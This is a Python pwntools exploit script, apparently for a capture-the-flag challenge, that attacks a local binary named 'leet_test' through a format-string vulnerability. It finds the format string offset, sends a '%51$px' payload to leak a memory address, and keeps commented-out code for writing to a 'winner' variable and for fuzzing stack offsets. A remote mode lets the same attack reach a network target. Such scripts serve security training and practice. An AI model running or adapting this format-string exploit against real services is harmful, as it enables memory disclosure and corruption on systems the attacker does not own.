from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_payload, fmtstr_split

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def send_payload(payload):
    #log.info("payload = %s" % repr(payload))
    p.sendline(payload)
    p.recvuntil(b'Hello,')
    return p.recv()

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# piebase 0x40c0 # .bss section
# breakrva 0x1352 # read call (before BoF)


# Set up pwntools for the correct architecture
exe = './leet_test'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'DEBUG'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
p = start()

# p = process(exe)

# winner = 0x404078
# #payload = p64(winner) + b'%10$p'
# payload = b'123%11$n' + p64(winner)
# p.sendlineafter('Please enter your name: ', payload)

# p.interactive()

#p.sendlineafter('Please enter your name: ', 'AAAAAAAAAAAA')

format_string = FmtStr(execute_fmt=send_payload)
info("format string offset: %d", format_string.offset)


#p.sendlineafter('Please enter your name: ', '%{}$px'.format(50))
p.sendline('%{}$px'.format(51))
# Receive the response
p.recvuntil('Hello,')
leaked_addr = p.recvlineS().strip()
if leaked_addr[-1] == 'x':
    leaked_addr = leaked_addr[:-1]
leaked_addr = int(leaked_addr, 16)
#leaked_addr = int(p.recvlineS().strip(), 16)
info('leaked_addr = 0x%x', leaked_addr)
#result = p.recvline()
#print(str(i) + ': ' + str(result))

#format_string.write(0x0, 0x1337babe) # write 0x1337babe at 0x0
#format_string.write(0x404078, 0) # write 0 at winner (variable)
# format_string.execute_writes()



# # Let's fuzz x values
# for i in range(100):
#     try:
#         p = process(exe)
#         # Format the counter
#         # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
#         #p.sendline('%{}$llx'.format(i))
#         p.sendlineafter('Please enter your name: ', '%{}$llx'.format(i))
#         # Receive the response
#         p.recvuntil(b'Hello,')
#         result = p.recvline()
#         print(str(i) + ': ' + str(result))
#         p.close()
#     except EOFError:
#         pass


